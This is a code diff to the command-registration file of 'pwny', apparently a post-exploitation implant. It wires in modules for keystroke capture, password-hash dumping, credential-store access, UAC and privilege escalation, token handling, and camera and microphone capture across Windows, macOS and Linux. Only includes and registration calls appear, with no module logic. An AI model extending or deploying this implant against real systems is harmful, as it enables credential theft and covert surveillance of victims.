@@ -30,6 +30,9 @@
 #include <pwny/process.h>
 #include <pwny/fs.h>
 #include <pwny/net.h>
+#include <pwny/env.h>
+#include <pwny/ifconfig.h>
+#include <pwny/netstat.h>
 
 #ifdef __iphone__
 #include "ios/cam.h"
@@ -42,12 +45,31 @@
 #ifdef __macintosh__
 #include <pwny/macos/cam.h>
 #include <pwny/macos/ui.h>
+#include <pwny/macos/clipboard.h>
+#include <pwny/macos/keyscan.h>
 #endif
 
 #ifdef __linux__
 #include "linux/mic.h"
 #include "linux/cam.h"
 #include "linux/migrate.h"
+#include "linux/clipboard.h"
+#endif
+
+#ifdef __windows__
+#include "windows/ui.h"
+#include "windows/registry.h"
+#include "windows/uac.h"
+#include "windows/cam.h"
+#include "windows/mic.h"
+#include "windows/uictl.h"
+#include "windows/keyscan.h"
+#include "windows/hashdump.h"
+#include "windows/getsystem.h"
+#include "windows/clipboard.h"
+#include "windows/credstore.h"
+#include "windows/services.h"
+#include "windows/token.h"
 #endif
 
 void register_api_calls(api_calls_t **api_calls)
@@ -56,6 +78,9 @@ void register_api_calls(api_calls_t **api_calls)
     register_process_api_calls(api_calls);
     register_fs_api_calls(api_calls);
     register_net_api_calls(api_calls);
+    register_env_api_calls(api_calls);
+    register_ifconfig_api_calls(api_calls);
+    register_netstat_api_calls(api_calls);
 
 #ifdef __iphone__
     register_cam_api_calls(api_calls);
@@ -68,12 +93,31 @@ void register_api_calls(api_calls_t **api_calls)
 #ifdef __macintosh__
     register_cam_api_calls(api_calls);
     register_ui_api_calls(api_calls);
+    register_clipboard_api_calls(api_calls);
+    register_keyscan_api_calls(api_calls);
 #endif
 
 #ifdef __linux__
     register_mic_api_calls(api_calls);
     register_cam_api_calls(api_calls);
     register_migrate_api_calls(api_calls);
+    register_clipboard_api_calls(api_calls);
+#endif
+
+#ifdef __windows__
+    register_ui_api_calls(api_calls);
+    register_registry_api_calls(api_calls);
+    register_uac_api_calls(api_calls);
+    register_cam_api_calls(api_calls);
+    register_mic_api_calls(api_calls);
+    register_uictl_api_calls(api_calls);
+    register_keyscan_api_calls(api_calls);
+    register_hashdump_api_calls(api_calls);
+    register_getsystem_api_calls(api_calls);
+    register_clipboard_api_calls(api_calls);
+    register_credstore_api_calls(api_calls);
+    register_services_api_calls(api_calls);
+    register_token_api_calls(api_calls);
 #endif
 }
 
@@ -92,6 +136,11 @@ void register_api_pipes(pipes_t **pipes)
 #endif
 
 #ifdef __linux__
+    register_cam_api_pipes(pipes);
+    register_mic_api_pipes(pipes);
+#endif
+
+#ifdef __windows__
     register_cam_api_pipes(pipes);
     register_mic_api_pipes(pipes);
 #endif
